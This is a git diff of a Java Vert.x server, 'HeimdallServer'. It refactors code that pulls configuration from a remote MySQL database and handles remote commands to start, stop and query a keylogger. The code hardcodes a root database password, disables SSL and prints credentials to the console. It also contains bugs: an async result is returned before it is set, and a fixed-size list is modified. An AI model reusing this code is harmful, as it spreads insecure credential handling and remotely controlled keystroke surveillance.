@@ -2,6 +2,7 @@ package com.server;
 
 import java.net.Inet4Address;
 import java.net.UnknownHostException;
+import java.util.Arrays;
 import java.util.Iterator;
 import java.util.List;
 
@@ -60,6 +61,7 @@ public class HeimdallServer extends AbstractVerticle {
 	private String asgard;
 	
 	private KeyLogger keylogger;
+	boolean success=false;
 	
 	
 	@SuppressWarnings("unused")
@@ -79,20 +81,29 @@ public class HeimdallServer extends AbstractVerticle {
 			  }
 		});
 	}
-	
-	public HeimdallServer(String a){
-		super();
-		this.asgard = a;
-		
+	private void getIP(){
 		try {
 			ip = Inet4Address.getLocalHost().getHostAddress();
 		} catch (UnknownHostException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
+	}
+	
+	private void parseHeimdal(List<String> args){
+		
+	}
+	
+	public HeimdallServer(List<String> args){
+		super();
+		this.asgard = args.get(0);
+		getIP();
 		System.out.println("Calling Asgard .....");
-		callAsgard(asgard);
+		if(callAsgard(asgard))
 		System.out.println("Located Asgard .....");
+		args.remove(0);
+		
+		
 		/*
 		jdbc = JDBCClient.createShared(vertx,new JsonObject()
 				.put("url","jdbc:mysql://"+config.getDb_config().getConnectionURL())
@@ -110,11 +121,9 @@ public class HeimdallServer extends AbstractVerticle {
 	private boolean callAsgard(String asgardServer) {
 		// Call DB and obtain configuration
 		config = new Config();
-		
 		VertxOptions vxOptions = new VertxOptions().setBlockedThreadCheckInterval(200000000);
 		vertx = Vertx.vertx(vxOptions);
 		
-		boolean success= false;
 		
 		JDBCClient asgard = JDBCClient.createShared(vertx, new JsonObject()
 				.put("url","jdbc:mysql://"+asgardServer+":3306/Heimdall?useSSL=false")
@@ -122,10 +131,12 @@ public class HeimdallServer extends AbstractVerticle {
 				.put("user","root")
 				.put("password","sys73xrv")
 				);
+	
 		
 		asgard.getConnection(res->{
 			if(res.succeeded()){
 				SQLConnection conn = res.result();
+				
 				conn.query("SELECT * FROM Heimdall.configurationProfile where name='default'", select ->{
 					if(select.succeeded() && select.result().getNumRows()>0){
 						DBConfig db = new DBConfig();
@@ -135,33 +146,24 @@ public class HeimdallServer extends AbstractVerticle {
 						db.setDbUser(obj.getString("db_user"));
 						db.setDbPassword(obj.getString("db_password"));
 						db.setDriver(obj.getString("class_driver"));
-						config.setDb_config(db);
-						
+						config.setDb_config(db);			
 						email.setDomain(obj.getString("email_smtp"));
 						email.setEmail_usr(obj.getString("email_user"));
 						email.setEmail_pwd(obj.getString("email_password"));
 						email.setPort(obj.getInteger("email_port"));
 						email.setEmail_to_send("security@heimdale.secure.com");
-						config.setEmail_config(email);	
-						
-						System.out.println("Configuration ->" + config.toString());
-						
+						config.setEmail_config(email);				
+						System.out.println("Configuration ->" + config.toString());	
+						success = true;
 						conn.close();
-						
-						
+					}else{
+						success=false;
 					}
 				});
-				
-				//conn.execute("", arg1)
 			}
-			
 		}
 		);
-		
 		return success;
-		
-		
-		
 	}
 
 	private ParserResponse parse(Iterator<String> args){
@@ -327,35 +329,28 @@ public class HeimdallServer extends AbstractVerticle {
 		String command = iterator.next();
 		System.out.println("Command Keylog :-> " + command);
 		switch(command){
-		case "stop":   response = stopkeylog(); break;
-		
-		case "start":{
-					   response=  start_keylog();
-					   
-					   
-					 }break;
-					 
-		case "status": response = status_keylog();				break;
+		case "stop":	response = stopkeylog();break;
+		case "start":	response=  start_keylog();break;
+		case "status": 	response = status_keylog();break;
 		
 		default:{
 			response.setResult(false);
 			response.setSresult("Invalid Command -> Please check help for more info  \n");
 			response.setComments("Unkown command.. Please check the valid sintaxis");
 			};
+		
+			
 		}return response;
 	}
 
 	private ParserResponse status_keylog() {
-		// TODO Auto-generated method stub
 		ParserResponse response = new ParserResponse();
 		if(keylogger!=null)
 			response.setResult(keylogger.isRunning());
 		return response;
 	}
 
-	private ParserResponse stopkeylog() {
-		// TODO Auto-generated method stub
-		
+	private ParserResponse stopkeylog() {		
 		ParserResponse response = new ParserResponse();
 		System.out.println("Keylogger running ? :"+keylogger.isRunning());
 		if(keylogger!=null)
@@ -368,13 +363,11 @@ public class HeimdallServer extends AbstractVerticle {
 				response.setResult(false);
 				response.setComments("Not running yet");
 			};
-		
 		return response;
 	}
 
 	private ParserResponse parse(String string) {
 		// Try to connect to the Asgard DB and get all the configuration Data
-		// 
 		ParserResponse response = new ParserResponse();
 		return response;
 	}
@@ -428,8 +421,16 @@ public class HeimdallServer extends AbstractVerticle {
 	}
 	
 	
+	
 	public static void main(String[] args){
-		int len = args.length;
+		HeimdallServer server;
+		
+		int size = args.length;
+		if(size>0)
+			server = new HeimdallServer(Arrays.asList(args));
+		
+		
+		/*int len = args.length;
 		System.out.println("Args->" + args[0]);
 		HeimdallServer server = new HeimdallServer(args[0]);
 		server.initServer();
@@ -440,7 +441,8 @@ public class HeimdallServer extends AbstractVerticle {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
-			System.out.println("Server initialized");
+			System.out.println("Server initialized");*/
+			
 	}
 
 
